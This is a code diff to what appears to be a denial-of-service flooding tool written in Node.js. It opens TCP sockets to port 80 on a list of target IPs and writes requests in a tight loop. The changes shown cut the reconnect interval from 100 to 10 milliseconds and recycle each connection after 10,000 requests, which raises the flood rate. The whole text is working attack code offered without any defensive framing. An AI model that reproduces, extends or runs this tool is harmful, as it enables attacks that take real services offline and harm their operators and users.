@@ -11,6 +11,7 @@ const perf_hooks_1 = require("perf_hooks");
 class Target {
     constructor(ip) {
         this.socket = null;
+        this.madeRequests = 0;
         this.ip = ip;
     }
 }
@@ -90,18 +91,19 @@ setInterval(() => {
     for (let target of targets) {
         run(target);
     }
-}, 100);
+}, 10);
 function run(target) {
     if (target.socket) {
         let prevSocket = target.socket;
         prevSocket.destroy();
+        target.madeRequests = 0;
     }
     var socket = new net_1.default.Socket();
     target.socket = socket;
     queue.delete(target);
     socket.connect(80, target.ip, function () {
         // console.log('Connected');
-        fuckClient(socket);
+        fuckClient(target);
     });
     socket.on('data', function (data) {
         // console.log('Received: ' + data);
@@ -113,7 +115,7 @@ function run(target) {
     socket.on('drain', function () {
         // console.log('drain');
         drains++;
-        fuckClient(socket);
+        fuckClient(target);
         // client.destroy(); // kill client after server's response
     });
     socket.on('close', function () {
@@ -126,13 +128,22 @@ function run(target) {
         queue.add(target);
     });
 }
-function fuckClient(client) {
+function fuckClient(target) {
+    var _a;
     let writeResult = false;
     do {
         inProgress++;
         counter++;
         totalRequestsMade++;
-        writeResult = client.write(text);
+        writeResult = target.socket.write(text);
+        target.madeRequests++;
+        if (target.madeRequests >= 10000) {
+            (_a = target.socket) === null || _a === void 0 ? void 0 : _a.destroy();
+            target.madeRequests = 0;
+            target.socket = null;
+            queue.add(target);
+            return;
+        }
     } while (writeResult == true);
     // console.log('writeResult: ' + writeResult);
 }
